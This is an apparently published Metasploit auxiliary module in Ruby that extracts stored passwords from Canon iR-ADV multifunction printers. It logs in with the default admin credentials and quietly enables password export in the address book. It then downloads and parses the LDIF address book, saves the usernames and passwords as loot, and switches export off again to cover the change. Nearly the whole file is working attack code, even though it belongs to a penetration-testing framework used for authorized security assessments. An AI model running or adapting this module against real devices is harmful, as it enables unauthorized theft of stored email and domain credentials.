##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Canon IR-Adv Password Extractor',
      'Description'    => %q{
        This module will extract the passwords from address books on various Canon IR-Adv mfp devices.
        Tested models:
        iR-ADV C2030,
        iR-ADV 4045,
        iR-ADV C5030,
        iR-ADV C5235,
        iR-ADV C5240,
        iR-ADV 6055,
        iR-ADV C7065
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi',
          'wvu',
          'Dev Mohanty'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptInt.new('ADDRSBOOK', [ true, 'The number of the address book to extract 1-11', 1]),
        Opt::RPORT(8000),
        OptString.new('USER', [ true, 'The default Admin user', '7654321']),
        OptString.new('PASSWD', [ true, 'The default Admin password', '7654321']),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ])
  end

  def run_host(ip)
    print_status("Attempting to extract passwords from the address books on the MFP at #{rhost}")
    login(ip)
  end

#Authenticate to management function on Canon MFP and build needed cookies for dta harvesting
  def login(ip)
    vars_post = {
      "uri" => "%2f",
      "deptid" => "#{datastore['USER']}",
      "password" => "#{datastore['PASSWD']}"
    }
    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => normalize_uri('/login'),
        'vars_post' => vars_post
      }, datastore['TIMEOUT'].to_i)
    end

    #grab Canon sessionid cookie
    idcookie = res.nil? ? nil : res.get_cookies

    if res && (res.code == 301 || res.code == 302 && res.headers.include?('Location'))
      print_good("#{rhost} - SUCCESSFUL login with USER='#{datastore['USER']}' : PASSWORD='#{datastore['PASSWD']}'")

      #grab Canon IR= session cookie
      res = send_request_cgi({
        'method'  => 'GET',
        'uri'     => normalize_uri('/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_CONF_ENV_PAP&Dummy=1400782981064'),
        'headers' => {'Cookie' => "#{idcookie}"},
      }, datastore['TIMEOUT'].to_i)
      ircookie = res.nil? ? nil : res.get_cookies
      cookies=("#{idcookie}; #{ircookie}")

      set_allow(cookies)
      extract(cookies, ip)
      set_disallow(cookies)

    else
      print_error("Failed to login on #{rhost}. Please check the password for the #{datastore['USER']} account ")
    end
  end


  # Set the allow password export to on
  def set_allow(cookies)
    vars_post = {
      "ADRSEXPPSWDCHK" => "0",
      "PageFlag" => "c_adrs.tpl",
      "Flag" => "Exec_Data",
      "CoreNXAction" => "./cadrs.cgi",
      "CoreNXPage" => "c_adrexppass.tpl",
      "CoreNXFlag" => "Init_Data",
      "Dummy" => "1359048058115"
    }
    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => normalize_uri('/rps/cadrs.cgi'),
        'vars_post' => vars_post,
        'headers' => {'Cookie' => "#{cookies}"},
      }, datastore['TIMEOUT'].to_i)
    end
  end

  # Extract the address book data and save out to loot
  def extract(cookies, ip)
    vars_post = {
      "AID" => "#{datastore['ADDRSBOOK']}",
      "ACLS" => "1",
      "ENC_MODE" => "0",
      "ENC_FILE" => "password",
      "PASSWD" => "",
      "PageFlag" => "",
      "AMOD" => "",
      "Dummy" => "1359047882596",
      "ERR_PG_KIND_FLG" => "Adress_Export"
    }
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri('/rps/abook.ldif'),
      'vars_post' => vars_post,
      'headers' => {'Cookie' => "#{cookies}"},
    }, datastore['TIMEOUT'].to_i)
    address_book = res.nil? ? nil : res.body
    print_status("#{address_book}")

    #Woot we got loot.
    loot_name     = "canon.iradv.addressbook"
    loot_type     = "text/plain"
    loot_filename = "Canon-addressbook.text"
    loot_desc     = "Canon Addressbook Harvester"
    p = store_loot(loot_name, loot_type, datastore['RHOST'], address_book , loot_filename, loot_desc)
    print_good("Credentials saved in: #{p}")

    harvest_ldif(address_book, ip)
  end

# Reset the allow password export to off
  def set_disallow(cookies)
    vars_post = {
      "ADRSEXPPSWDCHK" => "1",
      "PageFlag" => "c_adrs.tpl",
      "Flag" => "Exec_Data",
      "CoreNXAction" => "./cadrs.cgi",
      "CoreNXPage" => "c_adrexppass.tpl",
      "CoreNXFlag" => "Init_Data",
      "Dummy" => "1359048058115"
    }
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri('/rps/cadrs.cgi'),
      'vars_post' => vars_post,
      'headers' => {'Cookie' => "#{cookies}"},
    }, datastore['TIMEOUT'].to_i)
  end

  # Harvest Credential
  def harvest_ldif(address_book, ip)
    harvest_file(address_book, ip)
  end

  def harvest_credentials(mailaddress, pwd, ip)
    return if mailaddress == nil
    username_domain = mailaddress.split('@')
    username = username_domain[0]
    domain = username_domain[1]

    service_data = {
        address: Rex::Socket.getaddress(ip),
        port: rport,
        protocol: 'tcp',
        service_name: ssl ? 'https' : 'http',
        workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        username: username,
        private_data: pwd,
        private_type: :password
    }

    create_credential(credential_data.merge(service_data))

    print_good "Domain: #{domain}\nUser: #{username}\nPassword: #{pwd}\n\r"
  end

  def harvest_file(ldif, ip)
    users = []
    ldif.split("\r\n\r\n").each do |user|
      user_attributes = {}
      user.split("\r\n").each do |attribute|
        attribute_array = attribute.split(": ")
        attr_name = attribute_array.shift
        attr_value = attribute_array.join
        user_attributes[attr_name] = attr_value
      end
      harvest_credentials((user_attributes['username'] || user_attributes['mailaddress'] || user_attributes['mail']), user_attributes['pwd'], ip)
      users << user_attributes
    end
  end
end
